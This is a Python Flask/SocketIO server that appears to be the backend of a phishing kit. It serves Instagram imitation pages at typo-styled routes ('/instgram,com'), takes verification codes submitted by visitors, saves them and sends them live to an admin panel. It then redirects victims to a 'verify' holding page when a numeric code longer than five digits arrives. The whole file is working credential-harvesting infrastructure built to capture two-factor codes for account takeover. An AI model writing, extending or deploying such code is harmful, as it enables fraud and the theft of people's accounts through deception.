from flask import Flask, render_template, request, redirect, url_for
from flask_socketio import SocketIO, emit, join_room, send
from manager import add_code

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*")

@app.route("/", methods=["GET", "POST"])
def index():
    return redirect(url_for("instgram"))

@app.route("/instgram,com", methods=["GET", "POST"])
def instgram():
    return render_template("instgram.html", time=3000)

@app.route("/instgram,com-verify", methods=["GET", "POST"])
def instgramverify():
    return render_template("whaite.html", time=10000)

@app.route("/admin")
def source():
    return render_template("surce.html")


@socketio.on("join")
def join():
    join_room("admin")
    emit("msg", {"msg":f"[NEW] <span class='info'>{request.sid}</span>"}, room="admin")
    print(f"[NEW] {request.sid}")

@socketio.on("admin_join")
def adminjoin():
    join_room("admin")

@socketio.on("code")
def getcode(data):
    msg = data.get("msg")
    if not msg:
        msg = "NULL"
    add_code(msg)
    print(f"[CODE] {msg}")
    emit("msg", {"msg":f"[CODE] <span class='code'>{msg}</span>"}, room="admin")
    if len(msg) > 5 and str(msg).isdigit():
        emit("redirect", {"path":f"/instgram,com-verify"}, room="admin")
    else:
        emit("redirect", {"path":"/instgram,com"}, room="admin")
    
if __name__ == "__main__":
    port = input("port[5000] ")
    if port and port.isdigit():
        socketio.run(app, debug=False, port=port, host="0.0.0.0")
    socketio.run(app, debug=False, port=5000, host="0.0.0.0")